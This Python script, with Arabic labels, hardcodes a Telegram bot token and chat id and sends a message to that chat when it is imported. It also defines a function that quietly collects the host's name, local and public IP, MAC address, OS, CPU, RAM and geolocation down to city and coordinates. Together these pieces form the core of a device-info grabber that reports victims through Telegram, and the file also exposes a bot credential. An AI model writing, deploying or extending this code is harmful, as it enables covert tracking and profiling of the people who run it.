import requests
def check(text):
    try:
        id_tele = '5906639778'
        tokn_bot = '8469595165:AAHf51NfW9XiHgnVO1KmtW6HGeqNnXERg6Q'
        requests.get(f'https://api.telegram.org/bot{tokn_bot}/sendMessage?chat_id={id_tele}&text=: {text}')
    except requests.RequestException:
        return False
check('hellllo')
import socket
import uuid
import platform
import psutil
import requests

def get_device_info():
 
    hostname = socket.gethostname()

    try:
        ip_address = socket.gethostbyname(hostname)
    except socket.gaierror:
        ip_address = "لا يمكن الحصول على الـ IP المحلي"
    

    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
                    for ele in range(0, 8*6, 8)][::-1])


    system = platform.system()
    version = platform.version()
    release = platform.release()
    architecture = platform.machine()
    processor = platform.processor()
    
    # الرام
    ram = round(psutil.virtual_memory().total / (1024 ** 3), 2)  # GB


    try:
        res = requests.get("http://ip-api.com/json/")
        location_data = res.json()
        public_ip = location_data.get("query", "غير معروف")
        city = location_data.get("city", "غير معروف")
        region = location_data.get("regionName", "غير معروف")
        country = location_data.get("country", "غير معروف")
        zip_code = location_data.get("zip", "غير معروف")
        lat = location_data.get("lat", "غير معروف")
        lon = location_data.get("lon", "غير معروف")
        timezone = location_data.get("timezone", "غير معروف")
        isp = location_data.get("isp", "غير معروف")
    except Exception:
        public_ip = city = region = country = zip_code = lat = lon = timezone = isp = "تعذر الحصول على الموقع"

    info1 = (f"🖥️ اسم الجهاز: {hostname}")
    info2 = (f"🌐 IP المحلي: {ip_address}")
    info3 = (f"🌍 IP العام: {public_ip}")
    info4 = (f"📍 المدينة: {city}")
    info5 = (f"🏞️ المنطقة: {region}")
    info6 = (f"🇮🇶 الدولة: {country}")
    info7 = (f"🏷️ الرمز البريدي: {zip_code}")
    info8 = (f"🧭 خط العرض: {lat}, خط الطول: {lon}")
    info9 = (f"⏰ المنطقة الزمنية: {timezone}")
    info10 = (f"📡 مزود الخدمة: {isp}")
    info11 = (f"🔌 عنوان MAC: {mac}")
    info12 = (f"💻 نظام التشغيل: {system} {release} (الإصدار: {version})")
    info13 = (f"⚙️ المعالج: {processor}")
    info14 = (f"🏗️ المعمارية: {architecture}")
    info15 = (f"🧠 حجم الرام: {ram} GB")
    f = [
        info1,

        info2,

        info3,

        info4,

        info5,

        info6,

        info7,

        info8,

        info9,

        info10,

        info11,

        info12,

        info13,

        info14,

        info15,
    ]
    return f
